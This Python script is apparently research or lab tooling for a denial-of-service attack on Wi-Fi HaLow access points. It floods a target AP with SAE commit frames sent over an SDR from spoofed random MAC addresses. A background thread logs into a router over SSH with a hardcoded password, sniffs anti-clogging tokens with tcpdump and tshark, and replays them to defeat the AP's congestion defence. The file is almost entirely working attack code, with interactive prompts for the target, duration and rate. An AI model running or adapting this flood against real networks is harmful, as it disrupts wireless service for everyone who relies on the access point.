import utils
import random
import time
from SDRtransmitTCP import transmitData
from attack.frames.sae_commit_frame import commit_frame
import threading
import subprocess
import json
import select
import queue

cookie_queue = queue.Queue()
time_filter = f'frame.time >= "{time.time()}""'
pcap = None

stop_track = threading.Event()
lock = threading.Lock()
def _track_cookie():
    global cookie_queue
    track_cmd = ["sshpass", "-p", "halow", "ssh", "root@10.42.0.1", "tcpdump", "-i", "morse0", "-u", "-s0", "-w", "-", "# LIVE_TOKEN_TRACKER"]

    buf = subprocess.Popen(track_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE,bufsize=1024)

    tshark = subprocess.Popen(
        [
            "tshark",
            "-r", "-",
            "-Y", "wlan.fixed.anti_clogging_token",
            "-T", "ek"
        ],
        stdin=buf.stdout,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    stdout = tshark.stdout
    # loop through the output of stdout

    for line in stdout:
        if stop_track.is_set():
            break

        if not line.strip():
            continue
        
        packet = json.loads(line)

        random_mac = None
        ap_mac = None
        cookie = None
        if "layers" in packet:
            if "wlan" in packet["layers"]:
                ap_mac = packet["layers"]["wlan"]["wlan_wlan_sa"]
                random_mac = packet["layers"]["wlan"]["wlan_wlan_ra"]
            if "wlan_wlan_mgt" in packet["layers"]:
                cookie = bytes.fromhex(packet["layers"]["wlan_wlan_mgt"]["wlan_wlan_fixed_anti_clogging_token"].replace(":",""))

        if random_mac is not None and cookie is not None and ap_mac is not None:
            cookie_queue.put((ap_mac,random_mac,cookie))
            #frame_bytes = commit_frame(target_mac=ap_mac, src_mac=random_mac,cookie=cookie)
            #transmitData(frame_bytes)


    #terminate subprocesses
    tshark.terminate()
    tshark.wait()
    buf.terminate()
    buf.wait()

def random_mac():
    """
    Generate a random spoofed client MAC.
    
    return: random string of mac addresses
    """
    mac = [0x02 | random.randint(0, 1)] + [random.randint(0, 255) for _ in range(5)]
    return ':'.join(f'{b:02x}' for b in mac)

def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16):
    """
    Send 'count' SAE commit frames from random STA MACs to the given AP MAC.
    Each frame forces the AP to run hash-to-curve (expensive ECC operation).
    """
    print(f"[*] Flooding {ap_mac} with a rate of {rate} SAE commit frames")
    start_time = time.time()
    frame_bytes = None
    test = 0
    test_time = time.time()
    while time.time()- start_time < duration:
        try:
            q_ap_mac, q_random_mac, q_cookie = cookie_queue.get_nowait()
            frame_bytes = commit_frame(target_mac=q_ap_mac, src_mac=q_random_mac,cookie=q_cookie)
        except queue.Empty:        
            src = random_mac()
            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src)
    
        transmitData(frame_bytes)
        test += 1
        if test == rate:
            print("time elapsed in seconds: ", time.time() - test_time)
            print("transmitted: ", test, " frames")
            test = 0
            test_time = time.time()
        time.sleep(1/rate)

def start_dos():
    #start threading
    print("which mac do you want to target (leave empty for default AP MAC): ")
    target = input("MAC: ")

    if target == "":
        ap_mac = utils.get_mac("TrustedAP")[0]
    else:
        ap_mac = target

    #set the durations
    duration = int(input("Duration of attack (in seconds): "))
    rate = float(input("enter rate of frames to transmit: "))

    stop_track.clear()
    threading.Thread(target=_track_cookie,daemon=True).start()

    flood_sae_commits(ap_mac, duration, rate)

    #stop threading
    stop_track.set()



